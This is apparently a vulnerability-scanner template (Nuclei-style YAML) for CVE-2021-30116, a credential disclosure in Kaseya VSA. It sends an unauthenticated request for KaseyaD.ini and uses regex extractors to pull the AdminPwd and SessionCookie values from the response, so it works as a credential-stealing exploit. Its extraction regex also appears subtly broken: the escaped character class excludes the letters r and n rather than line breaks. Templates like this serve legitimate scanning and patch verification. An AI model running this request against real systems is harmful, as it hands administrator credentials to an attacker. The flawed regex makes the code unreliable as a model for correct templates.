id: cve-2021-30116
info:
  name: Kaseya VSA Broken Authentication - Credential Disclosure
  author: guiknx
  severity: critical
  description: |
    Kaseya VSA <=9.5.7 allows unauthenticated credential disclosure via /dl.asp?load=KaseyaD.ini.
    By acessing this endpoint, an attacker can retrieve the AdminPwd and SessionCookie values,
    thereby bypassing authentication.
  reference:
    - https://secpod.com/blog/kaseya-vsa-zero-day-by-revil/
  tags: 
    - cve
    - cve-2021-30116
    - authentication
    - ini

http:
  - name: "Attempt KaseyaD.ini download"
    method: GET
    path:
      - "{{BaseURL}}/dl.asp?load=KaseyaD.ini"
    matchers:
      # procura pelas chaves no corpo
      - type: word
        words:
          - "AdminPwd="
          - "SessionCookie="
    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - 'AdminPwd=([^\\r\\n]+)'
          - 'SessionCookie=([^\\r\\n]+)'
